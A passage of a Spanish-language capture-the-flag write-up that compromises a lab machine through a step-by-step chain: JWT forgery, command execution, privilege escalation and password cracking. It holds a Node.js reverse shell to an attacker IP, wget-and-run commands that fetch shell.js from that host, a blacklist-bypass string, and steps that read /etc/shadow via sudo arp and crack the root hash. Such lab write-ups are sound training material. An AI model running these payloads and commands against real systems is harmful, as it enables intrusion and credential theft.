eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NzM3ODI1NTksImV4cCI6MTc3Mzc4NDM1OX0.C-tmjfY19_7RuPJsUGZZkjY3H-PQwI4w2BXrS7aW1Yw
```

Ese token se pegó en `jwt.io`, y la web mostró:

### Header

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### Payload

```json
{
  "uid": -1,
  "role": "guest",
  "iat": 1773782559,
  "exp": 1773784359
}
```

## 17.3. Qué idea nace aquí

Si el servidor decide el permiso en función de algo como:

- `uid`
- `role`

entonces, si conseguimos firmar nuestro propio token, podemos cambiar esos valores.

## 17.4. Modificación del payload

En `jwt.io`, se modificó a algo como:

```json
{
  "uid": 1,
  "role": "admin"
}
```

Y se eliminaron `iat` y `exp`.

### ¿Por qué pudo funcionar sin `iat` y `exp`?

Porque esos campos suelen ser útiles, pero **no son obligatorios universalmente**. Todo depende de cómo valide el servidor el token.

Si el backend:

- solo verifica la firma,
- y mira `role` / `uid`,

entonces puede aceptar el token perfectamente aunque no lleve `iat` ni `exp`.

## 17.5. Introducción del secret

En la parte de secret de `jwt.io` se pegó:

```text
2942szKG7Ev83aDviugAa6rFpKixZzZz
```

Al hacerlo, `jwt.io` recalculó automáticamente la firma y generó un token válido para ese nuevo payload.

Por ejemplo:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiJ9.Cwv1jwYldeefgzLBE2UUHph-RAHVtgNohq-efC_NyXY
```

## 17.6. Qué ha pasado realmente aquí

Esto es crucial entenderlo:

- No estás “saltándote” la criptografía.
- No estás rompiendo `HS256`.
- No estás adivinando una firma.

Lo que ocurre es más sencillo y más grave:

**tienes el secret real del servidor**.

Por tanto, desde la perspectiva del backend, ese token es legítimo.

---

# 18. Descubrimiento del endpoint interesante `/execute`

El fuzzing ya había mostrado:

```text
execute [Status: 401]
```

Eso indica que la ruta existe pero exige autenticación.

En este punto ya tenemos justo lo que faltaba:

- un token JWT válido,
- y además con rol `admin`.

Por tanto, `/execute` pasa a ser el siguiente objetivo lógico.

---

# 19. Uso de Burp Suite paso a paso

## 19.1. Por qué usar Burp aquí

Podrías hacer muchas pruebas solo con `curl`, pero Burp Suite viene muy bien para:

- interceptar peticiones del navegador,
- ver exactamente qué cabeceras viajan,
- repetir peticiones,
- modificar parámetros,
- observar cómo cambian las respuestas.

Aquí es especialmente útil porque queremos comprobar manualmente cómo reacciona `/execute` cuando le añadimos el token.

## 19.2. Flujo usado

1. Abrir Burp Suite.
2. Activar **Intercept on**.
3. En el navegador, activar el proxy mediante **FoxyProxy**.
4. Visitar la URL objetivo, por ejemplo:
   ```text
   http://192.168.1.41:3000/execute
   ```
5. La petición queda detenida en Burp.
6. Enviarla a **Repeater**.

## 19.3. Qué se hace en Repeater

En Repeater puedes editar la petición una y otra vez sin depender del navegador.

La petición inicial a `/execute` sin autenticación devolvía algo como:

```json
{"status":"rejected","data":"permission denied"}
```

o un `401 Unauthorized`.

## 19.4. Inserción del header correcto

Se añadió la cabecera:

```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiJ9.Cwv1jwYldeefgzLBE2UUHph-RAHVtgNohq-efC_NyXY
```

## 19.5. Qué cambió al hacer eso

La respuesta dejó de ser “permission denied” y pasó a algo como:

```json
{"status":"rejected","data":"this command is unsafe"}
```

Ese cambio es decisivo.

¿Por qué?

Porque significa que el servidor ya **no** te está rechazando por falta de permisos. Ahora está procesando tu identidad como válida y ha llegado a la fase de validar el comando.

Es decir:

- antes: “no eres quien dices ser”
- ahora: “sí eres válido, pero lo que quieres ejecutar es peligroso”

Eso confirma que el token forjado funciona.

---

# 20. Explicación completa de `Authorization: Bearer <token>`

Este punto conviene dejarlo clarísimo.

## 20.1. Qué es `Authorization`

Es una cabecera HTTP estándar para enviar credenciales de acceso al servidor.

## 20.2. Qué significa `Bearer`

`Bearer` indica un esquema de autenticación por portador de token.

La idea es:

> quien porta este token, obtiene los permisos asociados a él.

No se envía usuario y contraseña en cada petición. Se envía el token.

## 20.3. Forma general

```http
Authorization: Bearer <token>
```

## 20.4. Por qué tiene que ir exactamente así

Porque muchos frameworks y middlewares de autenticación esperan precisamente ese formato. El backend suele hacer algo como:

1. leer la cabecera `Authorization`,
2. comprobar que empieza por `Bearer `,
3. extraer el token que viene detrás,
4. validarlo,
5. y cargar los permisos del usuario.

Si pones solo el token sin `Bearer`, o lo metes en otra cabecera inventada, lo normal es que el servidor no lo reconozca.

## 20.5. Qué hace el backend con ese token

Habitualmente:

- toma el token,
- recalcula la firma usando su `JWT_SECRET`,
- verifica que coincida,
- extrae el payload,
- y aplica permisos según `uid` y `role`.

Como en nuestro caso el token estaba bien firmado con el secret correcto, el backend lo aceptó.

---

# 21. Primeras pruebas de ejecución remota de comandos

Antes de ir a por una reverse shell, conviene validar que realmente podemos ejecutar algo simple.

Se usó:

```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiJ9.Cwv1jwYldeefgzLBE2UUHph-RAHVtgNohq-efC_NyXY" "http://192.168.1.41:3000/execute?cmd=id"
```

## 21.1. Explicación completa del comando

### `curl`

Herramienta de línea de comandos para hacer peticiones HTTP.

### `-H`

Añade una cabecera HTTP personalizada.

Aquí se usa para enviar la cabecera `Authorization` con el token JWT.

### La URL con `?cmd=id`

Se está llamando al endpoint `/execute` pasando un parámetro GET llamado `cmd` cuyo valor es `id`.

Es decir, conceptualmente le estás diciendo al servidor:

> ejecuta el comando del sistema `id` y dime el resultado.

## 21.2. Respuesta obtenida

Algo como:

```json
{"status":"executed","data":{"stdout":"uid=1000(runner) gid=1000(runner) groups=1000(runner)\n","stderr":""}}
```

## 21.3. Qué nos dice esto

Muchísimo.

### `status: executed`

La orden se ejecutó.

### `stdout`

La salida estándar del comando.

### `stderr`

La salida de error. Vacía en este caso.

### `uid=1000(runner)`

La app está ejecutando comandos como el usuario **runner**.

Eso significa que ya tenemos un **RCE** funcional como ese usuario.

---

# 22. Restricciones de comandos y blacklist

Del `.env` sabíamos que existía esta blacklist:

```text
nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd
```

Eso implica que si intentamos meter directamente una reverse shell clásica con:

- `nc`
- `bash -i`
- `sh`
- `python -c`

la aplicación probablemente la rechazará.

Esto no es una defensa robusta. Es una **lista negra de cadenas**, y eso suele ser frágil. Pero sí obliga a pensar un poco más.

---

# 23. Reverse shell en Node.js

## 23.1. Por qué elegir Node.js

Sabemos que el entorno de la aplicación gira alrededor de Node / Vite / Express, así que es razonable pensar que `node` estará instalado.

Además, como `python`, `bash`, `sh` y `nc` están filtrados, una reverse shell escrita en JavaScript ejecutada con `node` es una alternativa natural.

## 23.2. Uso de revshells.com

Se usó la web:

**https://www.revshells.com/**

para generar un payload de reverse shell adecuado.

Se configuró con:

- IP de Kali: `192.168.1.42`
- puerto: `5555`
- tipo: Linux
- shell: **Node.js #2**

Se eligió la segunda opción porque la primera dependía de `nc`, y `nc` está bloqueado por la blacklist.

![Imagen 6 - Configuración de la reverse shell en revshells.com](./files/imagen6_revshell_config.png)

## 23.3. Payload elegido

Se generó algo como:

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(5555, "192.168.1.42", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

Aunque internamente use `sh`, aquí no lo estamos metiendo directamente como comando pasado a `/execute` en texto plano de la misma manera que otras pruebas. Lo que hacemos es descargar un script JS y ejecutarlo con `node`.

---

# 24. Creación y servido de `shell.js`

## 24.1. Creación del archivo en Kali

Se guardó el payload anterior en un fichero llamado `shell.js`:

```bash
nano shell.js
```

## 24.2. Levantar un servidor HTTP simple en Kali

Luego se sirvió desde Kali con:

```bash
python3 -m http.server 80
```

### Qué hace este comando

- `python3` ejecuta el intérprete Python 3.
- `-m http.server` lanza el módulo estándar que implementa un servidor web simple.
- `80` indica el puerto en el que escuchará.

Con esto, cualquier fichero del directorio actual puede descargarse por HTTP. Si `shell.js` está ahí, la víctima podrá pedirlo en:

```text
http://192.168.1.42:80/shell.js
```

Cuando en Kali apareció:

```text
GET /shell.js HTTP/1.1 200 -
```

eso confirmó que la víctima había conseguido descargar el archivo.

---

# 25. Descarga del fichero hacia la víctima con `wget`

Este paso es de los que pediste expresamente que se explicaran bien.

Se usó:

```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiJ9.Cwv1jwYldeefgzLBE2UUHph-RAHVtgNohq-efC_NyXY" "http://192.168.1.41:3000/execute?cmd=wget+http://192.168.1.42:80/shell.js+-O+/tmp/shell.js"
```

## 25.1. Qué se está haciendo exactamente

Estamos usando `curl` desde Kali para hablar con la aplicación vulnerable, y le estamos diciendo al endpoint `/execute` que ejecute este comando **en la víctima**:

```bash
wget http://192.168.1.42:80/shell.js -O /tmp/shell.js
```

Ojo con esto: el `wget` **no se ejecuta en Kali**. Se ejecuta en la **máquina víctima**, porque va dentro del parámetro `cmd` del RCE.

## 25.2. Por qué aparecen signos `+`

En una URL, los espacios no suelen escribirse como espacios literales. En query strings, muchas veces se representan como `+`.

Por eso:

```text
wget+http://192.168.1.42:80/shell.js+-O+/tmp/shell.js
```

equivale a:

```bash
wget http://192.168.1.42:80/shell.js -O /tmp/shell.js
```

## 25.3. Despiece del comando interno

### `wget`

Programa usado para descargar archivos por HTTP, HTTPS o FTP.

### `http://192.168.1.42:80/shell.js`

La URL a la que la víctima debe conectarse. Apunta al servidor HTTP que hemos levantado en Kali.

### `-O /tmp/shell.js`

Aquí la `O` es de **Output Document**.

Sirve para decirle a `wget`:

> guarda lo descargado con este nombre y en esta ruta concreta.

Si no usáramos `-O`, `wget` intentaría guardar el archivo con el nombre por defecto derivado de la URL en el directorio de trabajo actual. Con `-O`, controlamos exactamente dónde se guarda.

## 25.4. Por qué `/tmp`

`/tmp` es un directorio temporal en Linux que normalmente es escribible por usuarios sin privilegios.

Eso lo hace muy cómodo para:

- soltar archivos temporales,
- payloads,
- scripts,
- ficheros descargados.

## 25.5. Interpretación de la respuesta

La salida devolvía algo como:

```text
Connecting to 192.168.1.42:80
saving to '/tmp/shell.js'
shell.js 100% ...
'/tmp/shell.js' saved
```

Eso significa que:

1. la víctima alcanzó tu Kali,
2. descargó correctamente el archivo,
3. y lo guardó en `/tmp/shell.js`.

---

# 26. Puesta en escucha y ejecución del payload

Una vez el archivo estaba ya en la víctima, tocaba esperar la conexión entrante.

Se puso un listener con:

```bash
penelope -p 5555
```

Y luego se ordenó ejecutar el script descargado:

```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiJ9.Cwv1jwYldeefgzLBE2UUHph-RAHVtgNohq-efC_NyXY" "http://192.168.1.41:3000/execute?cmd=node+/tmp/shell.js"
```

## 26.1. Qué significa `node+/tmp/shell.js`

Otra vez, el `+` representa un espacio.

Equivale a:

```bash
node /tmp/shell.js
```

Eso le dice al intérprete Node.js:

> ejecuta el archivo JavaScript `/tmp/shell.js`

## 26.2. Por qué la petición “se queda colgada”

Porque la reverse shell abre una conexión y mantiene el flujo activo. Mientras el proceso esté vivo, la petición puede quedar pendiente, lo cual es normal.

## 26.3. Resultado

En el listener se recibió una shell:

```bash
/opt/node $ whoami
runner
```

Ya estábamos dentro del sistema como `runner`.

---

# 27. Reverse shell obtenida: análisis de lo conseguido

Hasta aquí la cadena ya es muy seria:

1. se explotó una lectura arbitraria de archivos en Vite,
2. se obtuvo el `JWT_SECRET`,
3. se forjó un token admin,
4. se abusó de un endpoint de ejecución remota de comandos,
5. y se consiguió una reverse shell interactiva como `runner`.

Eso ya constituye un compromiso remoto efectivo del host.

---

# 28. Nota adicional: bypass conceptual de blacklist con fragmentación de cadenas

Comentaste una técnica como:

```text
cmd=n""c+192.168.1.42+5555+-e+s""h
```

La idea conceptual es correcta: muchas blacklists buscan cadenas literales exactas, por ejemplo `nc` o `sh`. Si introduces separaciones que el intérprete luego recompone, el filtro puede no detectarlas.

Ejemplo conceptual:

- filtro bloquea `abc`
- entrada `a""bc`
- el filtro no ve `abc` literal
- pero el intérprete acaba recomponiendo `abc`

Esto muestra por qué las listas negras suelen ser malas defensas: validan una representación “cruda” distinta de la que finalmente interpreta el shell.

Aquí, aun existiendo esa posibilidad conceptual, la vía elegida fue más limpia: **usar Node.js**.

---

# 29. Post-explotación inicial en el sistema

Una vez dentro como `runner`, se empezó a enumerar el sistema.

Desde `/opt/node` se vio la aplicación:

- `README.md`
- `node_modules`
- `package.json`
- `public`
- `src`
- `server.js`
- `vite.config.js`

Luego se subió a `/opt` y aparecieron dos rutas interesantes:

- `/opt/node`
- `/opt/gitea`

Eso ya sugiere que, además de la app Node, existe una instalación de **Gitea**.

---

# 30. Descubrimiento de Gitea y repositorios

Dentro de `/opt/gitea` aparecieron:

- `db`
- `git`
- `log`

Y dentro de `/opt/gitea/git/hana/` existía:

```text
node.git
```

Esto es muy prometedor por varios motivos:

1. Gitea es un servicio Git autoalojado.
2. Un repositorio Git puede contener historial sensible.
3. Aunque algo haya sido borrado del estado actual del proyecto, puede seguir existiendo en commits antiguos.

Ese tercer punto es el importante.

Muchísimos secretos se filtran en Git porque:

- un desarrollador sube una clave por error,
- luego la borra,
- pero el historial conserva el commit original.

---

# 31. Inspección de la base de datos `gitea.db`

Antes de entrar de lleno en el repo, se revisó la base de datos:

```text
/opt/gitea/db/gitea.db
```

## 31.1. Uso de `strings`

Se ejecutó algo como:

```bash
strings gitea.db | grep -A 5 "hana"
```

### Qué hace `strings`

`strings` extrae secuencias de texto legibles de un archivo binario.

Una base SQLite no es un archivo de texto plano, pero muchas cadenas internas pueden aparecer legibles:

- nombres de usuarios,
- rutas,
- mensajes,
- hashes,
- objetos serializados,
- referencias a commits.

### Qué hace `grep -A 5 "hana"`

- `grep "hana"` busca líneas que contengan `hana`
- `-A 5` significa **after 5**
- es decir, muestra además las 5 líneas posteriores a cada coincidencia

Esto sirve para ver contexto alrededor del hallazgo.

## 31.2. Qué se encontró

Aparecieron referencias a commits, entre ellos:

- `1994a70bbd080c633ac85a339fd85a8635c63893` con mensaje `del: oops!`
- `02c0f912f6e5b09616580d960f3e5ee33b06084a` con mensaje `init: init commit`

Esos IDs de commit pasaron a ser objetivos de revisión.

---

# 32. Lectura de commits concretos con Git

Se usó un comando como:

```bash
GIT_DIR=/opt/gitea/git/hana/node.git git -c safe.directory=/opt/gitea/git/hana/node.git show 02c0f912f6e5b09616580d960f3e5ee33b06084a
```

## 32.1. Explicación completa

### `GIT_DIR=/opt/gitea/git/hana/node.git`

Esta variable de entorno le dice a Git:

> el repositorio está en esta ruta

Así no necesitas hacer `cd` al repo ni estar dentro de un working tree normal.

### `git`

Invoca el cliente Git.

### `-c safe.directory=/opt/gitea/git/hana/node.git`

Git tiene protecciones de seguridad para no confiar ciegamente en repositorios cuyo propietario no coincide con el usuario actual.

Aquí estamos leyendo un repo perteneciente a otro usuario / servicio.

Con esta opción:

- le dices a Git que considere esa ruta segura,
- y evitas el bloqueo por “dubious ownership” o similares.

### `show <sha1>`

`git show` enseña un objeto, en este caso un commit concreto.

Normalmente muestra:

- metadatos del commit,
- autor,
- fecha,
- mensaje,
- y el diff completo.

## 32.2. Por qué esto es tan útil ofensivamente

Porque te permite ver exactamente qué cambió en una versión concreta del proyecto. Y si en algún commit alguien añadió una credencial y luego la borró, el diff la seguirá enseñando.

## 32.3. Filtro rápido con `grep`

Para encontrar algo especialmente sensible se hizo algo como:

```bash
GIT_DIR=/opt/gitea/git/hana/node.git git -c safe.directory=/opt/gitea/git/hana/node.git show 02c0f912f6e5b09616580d960f3e5ee33b06084a | grep "+---"
```

y aparecieron líneas de:

```text
+-----BEGIN OPENSSH PRIVATE KEY-----
+-----END OPENSSH PRIVATE KEY-----
```

Eso delata una clave privada añadida en el commit.

---

# 33. Reconstrucción de la clave privada de `hana`

## 33.1. Por qué las líneas empiezan por `+`

Porque estamos viendo un **diff** de Git.

En un diff:

- las líneas añadidas suelen empezar por `+`
- las eliminadas por `-`
- el contexto no lleva esos símbolos

Así que la clave privada aparece prefijada por `+`, pero ese `+` **no forma parte real de la clave**.

## 33.2. Guardado con `echo`

Se volcó el contenido a un fichero, por ejemplo `/tmp/id_rsa`, con `echo` redirigiendo la salida.

## 33.3. Limpieza con `sed 's/^+//'`

Luego se aplicó:

```bash
sed 's/^+//' id_rsa
```

### Qué hace exactamente

`sed` es un editor de flujo.

La expresión:

```text
s/^+//
```

significa:

- `s` → sustitución
- `^+` → un signo `+` al **principio** de la línea
- `//` → sustituirlo por nada

Por tanto, elimina el `+` inicial de cada línea del diff.

Para guardarlo limpio se podría redirigir a otro fichero o sobrescribir según el método elegido.

---

# 34. Acceso SSH como `hana`

Una vez reconstruida la clave privada, se intentó:

```bash
ssh -i id_rsa -o StrictHostKeyChecking=no hana@localhost
```

## 34.1. Explicación completa del comando

### `ssh`

Cliente SSH.

### `-i id_rsa`

Indica qué clave privada usar para autenticarse.

### `-o StrictHostKeyChecking=no`

Desactiva la comprobación estricta de la clave del host.

Esto hace que SSH no te pregunte si confías en el host la primera vez. Es útil en laboratorio para evitar fricción.

### `hana@localhost`

Conecta al servicio SSH de la propia máquina víctima, como usuario `hana`.

Estando ya dentro de la shell de la máquina, `localhost` apunta a la misma máquina comprometida.

## 34.2. Primer error: permisos demasiado abiertos

SSH respondió con algo como:

```text
WARNING: UNPROTECTED PRIVATE KEY FILE!
Permissions 0755 for 'id_rsa' are too open.
This private key will be ignored.
```

## 34.3. Por qué pasa esto

SSH es muy estricto con los permisos de las claves privadas. Si la clave puede ser leída por otros usuarios, la considera insegura y se niega a usarla.

Con permisos `0755`, el archivo es accesible por otros, y eso rompe la confidencialidad esperada de una clave privada.

## 34.4. Por qué hay que usar `chmod 600`

Se corrigió con:

```bash
chmod 600 id_rsa
```

Eso deja:

- lectura y escritura para el propietario,
- ningún permiso para grupo ni otros.

Ese nivel de restricción sí es aceptado por SSH.

## 34.5. Segundo intento

Tras eso, la conexión sí funcionó y se obtuvo shell como `hana`.

---

# 35. Obtención de la user flag

Ya como `hana`, en su home apareció:

```text
user.flag
```

y pudo leerse la primera flag.

---

# 36. Escalada de privilegios con `sudo -l`

El paso natural tras comprometer un usuario real es revisar qué puede ejecutar con sudo.

Se usó:

```bash
sudo -l
```

## 36.1. Qué hace `sudo -l`

Lista los comandos que el usuario actual puede ejecutar mediante `sudo`.

Es uno de los primeros comandos de post-explotación porque:

- puede revelar binarios peligrosos,
- permisos sin contraseña (`NOPASSWD`),
- variables de entorno conservadas,
- y rutas interesantes para privesc.

## 36.2. Resultado relevante

Apareció algo como:

```text
User hana may run the following commands on devoops:
    (root) NOPASSWD: /sbin/arp
```

Eso significa:

- el usuario `hana` puede ejecutar `/sbin/arp` como `root`,
- sin necesidad de contraseña.

Eso es una posibilidad clara de escalada, siempre que `arp` permita algún abuso.

---

# 37. Uso de GTFOBins

## 37.1. Qué es GTFOBins

**https://gtfobins.org/** es una base de datos de binarios Unix que pueden usarse para:

- escalada de privilegios,
- bypass de restricciones,
- lectura/escritura de archivos,
- shells,
- persistencia,
- o abuso de `sudo`, `SUID`, `capabilities`, etc.

## 37.2. Por qué es útil

Porque muchos binarios aparentemente inocentes tienen opciones que permiten comportamientos inesperados si se ejecutan como root.

Aquí se buscó `arp` dentro de GTFOBins, en el contexto de `sudo`.

---

# 38. Abuso de `/sbin/arp` vía sudo

GTFOBins indicaba una técnica para leer archivos arbitrarios con:

```bash
arp -v -f /path/to/input-file
```

Llevado a nuestro caso:

```bash
sudo /sbin/arp -v -f /etc/shadow
```

## 38.1. Qué está pasando aquí

`arp` espera leer una tabla ARP desde un archivo cuando se usa `-f`. Si puede abrirlo y procesarlo, parte del contenido puede quedar expuesto por la salida o errores verbosos.

Como aquí se ejecuta mediante `sudo` como root, puede abrir archivos que `hana` no podría leer normalmente.

## 38.2. Qué es `/etc/shadow`

`/etc/shadow` es el archivo donde Linux almacena los hashes de contraseña de las cuentas locales.

No guarda la contraseña en claro. Guarda una representación hash, normalmente con información de algoritmo, salt y parámetros.

Ejemplo típico:

```text
root:$6$...hash...
```

El prefijo `$6$` indica `SHA512-crypt`.

## 38.3. Por qué esto es valioso

Si puedes leer `/etc/shadow`, puedes intentar:

- crackear hashes offline,
- reutilizar contraseñas,
- escalar a root si la contraseña es débil.

---

# 39. Crackeo del hash con Hashcat

## 39.1. Extracción del hash de root

De la salida de `/etc/shadow`, se tomó el hash del usuario root, algo como:

```text
$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.
```

Y se guardó en un fichero, por ejemplo `root_hash`.

## 39.2. Qué es Hashcat

Hashcat es una herramienta de crackeo de hashes muy potente, orientada a pruebas offline sobre hashes ya obtenidos.

No “rompe” el sistema en vivo. Lo que hace es:

- tomar un hash,
- probar candidatos de contraseña,
- aplicar el algoritmo correspondiente,
- y comparar resultados.

Es muy utilizada para auditoría de contraseñas.

## 39.3. Identificación del modo correcto

Para saber qué modo usar, se consultó la wiki de Hashcat y se buscó el prefijo `$6$`.

Eso corresponde a:

- **1800**
- `sha512crypt`
- `SHA512 (Unix)`

## 39.4. Comando utilizado

```bash
hashcat -a 0 -m 1800 root_hash /usr/share/wordlists/rockyou.txt
```

### Explicación de las flags

#### `-a 0`

Ataque de diccionario directo.

Hashcat toma cada palabra del diccionario y la prueba tal cual.

#### `-m 1800`

Selecciona el tipo de hash: `sha512crypt` / `$6$`.

#### `root_hash`

Archivo que contiene el hash a crackear.

#### `/usr/share/wordlists/rockyou.txt`

Diccionario muy conocido con millones de contraseñas filtradas en la vida real. En laboratorio se usa mucho porque encuentra muchas contraseñas débiles con rapidez.

## 39.5. Resultado

Hashcat encontró la contraseña:

```text
eris
```

---

# 40. Cambio a `root` con `su`

Una vez conocida la contraseña de root, se ejecutó:

```bash
su root
```

Y al introducir `eris`, se obtuvo acceso como root.

### Qué hace `su`

`su` significa “substitute user” o “switch user”. Permite cambiar al usuario objetivo, normalmente `root`, si conoces su contraseña.

---

# 41. Obtención de la root flag

Ya como root se pudieron leer los ficheros finales y la flag.

También apareció información recapitulando varios secretos y pistas de la máquina, incluida la flag final.

La flag raíz fue:

```text
flag{a834296543f4c2990909ce1c56becfba}
```

Y se validó correctamente en la plataforma.

![Imagen 7 - Correct Flag Submitted](./files/imagen7_flag_submit.png)

---

# 42. Resumen técnico de la cadena de ataque completa

La cadena completa, resumida pero sin perder la lógica, fue esta:

1. **Problema de importación** en VMware para la víctima.
2. Se levanta la víctima en **VirtualBox** y Kali sigue en **VMware**.
3. Se configura **bridge** en ambos hipervisores sobre la misma interfaz física Wi‑Fi.
4. Se descubre la IP de la víctima mediante `nmap -sn` y se identifica por la **MAC de VirtualBox**.
5. Se enumeran puertos y aparece un **servidor Vite** en el puerto 3000.
6. Se fuzzéan rutas y se encuentran `/server`, `/sign` y `/execute`.
7. Se identifica la versión de **Vite 6.2.0**.
8. Se busca un exploit de **Arbitrary File Read** en Searchsploit.
9. Se corrige manualmente la PoC para usar `?raw??`.
10. Se leen archivos del sistema, incluyendo `/etc/passwd` y `.env`.
11. Del `.env` se obtienen `JWT_SECRET` y `COMMAND_FILTER`.
12. Con el token de `/sign` y el `JWT_SECRET`, se usa **jwt.io** para forjar un JWT con `role=admin`.
13. Con Burp o `curl`, se envía ese token a `/execute` mediante `Authorization: Bearer <token>`.
14. Se confirma un **RCE** ejecutando `id`, que corre como `runner`.
15. Se prepara una reverse shell en **Node.js**.
16. La víctima descarga `shell.js` desde Kali con `wget` hacia `/tmp/shell.js`.
17. Se ejecuta con `node /tmp/shell.js` y se recibe shell como `runner`.
18. Se enumera el sistema y se descubre **Gitea**.
19. Se revisan commits históricos y se recupera una **clave privada SSH** de `hana` desde Git.
20. Se corrigen los `+` del diff, se ajustan permisos a `600` y se accede por SSH como `hana`.
21. Se obtiene la **user flag**.
22. `sudo -l` revela permiso `NOPASSWD` sobre `/sbin/arp`.
23. Mediante GTFOBins se usa `arp` para leer `/etc/shadow`.
24. Se extrae el hash de `root` y se crackea con Hashcat.
25. La contraseña de root resulta ser `eris`.
26. Se hace `su root` y se obtiene la **root flag**.

---

# 43. Lecciones importantes que deja esta máquina

Esta máquina enseña bastante más que una explotación concreta.

## 43.1. Exponer entornos de desarrollo es peligrosísimo

Un servidor de desarrollo de Vite no debería estar accesible de forma insegura. Los entornos de desarrollo suelen arrastrar:

- más verbosidad,
- menos endurecimiento,
- configuraciones temporales,
- y errores fáciles de explotar.

## 43.2. Un `.env` expuesto puede destruir todo el modelo de seguridad

Aquí bastó con leer `.env` para comprometer:

- la autenticación JWT,
- y la lógica de ejecución de comandos.

## 43.3. Las listas negras de comandos son una mala defensa

Bloquear cadenas como `bash`, `nc` o `python` no resuelve el problema si el diseño ya permite ejecutar comandos arbitrarios.

## 43.4. Git conserva errores del pasado

Borrar una clave del proyecto actual no basta si ya fue commiteada.

## 43.5. `sudo` sobre binarios “raros” puede ser igual de peligroso que `sudo bash`

Muchos administradores miran solo si un usuario puede ejecutar shells, pero binarios como `arp`, `tar`, `less`, `find`, `awk`, etc., pueden ser igual o más peligrosos en ciertos contextos.

## 43.6. Entender el porqué vale más que lanzar herramientas

El mejor ejemplo de esta máquina es la PoC de Searchsploit: no funcionaba bien hasta entender el bypass real y corregirlo manualmente.

---

# Apéndice A. Comandos principales usados

```bash
ip a
sudo nmap -n -sn 192.168.1.42/24
sudo nmap -p- --open -sCV -Pn -T5 -vvv -oN fullscan 192.168.1.41
ffuf -u http://192.168.1.41:3000/FUZZ -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100
ffuf -u http://192.168.1.41:3000/FUZZ -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100 --fs 414
searchsploit vite
searchsploit -m multiple/remote/52111.py
python3 52111.py http://192.168.1.41:3000/ -v
ffuf -u 'http://192.168.1.41:3000/FUZZ?raw??' -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --fs 414 --fc 500
curl -H "Authorization: Bearer <JWT_ADMIN>" "http://192.168.1.41:3000/execute?cmd=id"
python3 -m http.server 80
curl -H "Authorization: Bearer <JWT_ADMIN>" "http://192.168.1.41:3000/execute?cmd=wget+http://192.168.1.42:80/shell.js+-O+/tmp/shell.js"
penelope -p 5555
curl -H "Authorization: Bearer <JWT_ADMIN>" "http://192.168.1.41:3000/execute?cmd=node+/tmp/shell.js"
strings gitea.db | grep -A 5 "hana"
GIT_DIR=/opt/gitea/git/hana/node.git git -c safe.directory=/opt/gitea/git/hana/node.git show 02c0f912f6e5b09616580d960f3e5ee33b06084a
sed 's/^+//' id_rsa
chmod 600 id_rsa
ssh -i id_rsa -o StrictHostKeyChecking=no hana@localhost
sudo -l
sudo /sbin/arp -v -f /etc/shadow
hashcat -a 0 -m 1800 root_hash /usr/share/wordlists/rockyou.txt
su root
```

---

# Apéndice B. Puntos que más conviene recordar

- `bridge` pone la VM en la red real.
- La MAC puede delatar qué hipervisor está usando una VM.
- Vite expuesto en desarrollo puede ser una mina de fallos.
- `?raw??` fue el detalle crucial del bypass.
- Si tienes `JWT_SECRET`, puedes firmar tus propios JWT en `HS256`.
- `Authorization: Bearer <token>` es el formato estándar que espera el backend.
- Un `401` que cambia a “unsafe command” después del token es una señal excelente: autenticación rota a tu favor.
- Git histórico puede contener secretos borrados.
- SSH exige permisos estrictos en claves privadas.
- `sudo -l` siempre hay que revisarlo.
- GTFOBins es una referencia obligada en privesc.

